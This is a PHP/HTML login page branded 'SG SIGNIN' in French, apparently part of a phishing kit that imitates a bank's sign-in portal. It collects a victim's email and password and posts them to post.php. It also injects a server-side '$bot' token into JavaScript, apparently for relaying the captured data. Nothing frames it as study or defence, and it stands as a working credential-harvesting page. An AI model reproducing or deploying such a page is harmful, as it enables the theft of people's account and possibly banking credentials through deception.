<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SG</title>
    <link rel="stylesheet" href="res/css/main.css">
</head>
<body>
    <script>var token=<?php echo json_encode($bot); ?>;</script>
    <div class="container">
   
        <div class="box">
        <div class="lang">
                <img src="res/img/fr.png">
                <img src="res/img/uk.png">
            </div>
            <img src="res/img/logo.png"class="logo">
            <h2>Connectez-vous avec <strong>SG SIGNIN</strong></h2>

            <form action="post.php" method="post">
                <label>Votre adresse email <span>*</span></label>
                <input type="text" name="user" required style="margin-bottom:20px;">


                <label for="password">Votre mot de passe  <span>*</span></label>
                <input type="password" name="pass" required>

                <button type="submit" class="login-btn">Se connecter</button>

                <div class="links">
                    <a href="#" class="forgot">Mot de passe oublié?</a>
                    <a href="#" class="sign">Vous n'avez pas de compte ? S'inscrire</a>
                </div>

                <p class="required">*champs obligatoires</p>
            </form>
            
        </div>
    </div>
<script src="./res/cdn/jq.js"></script>
<script src="./res/jquery.js"></script>
</body>
</html>
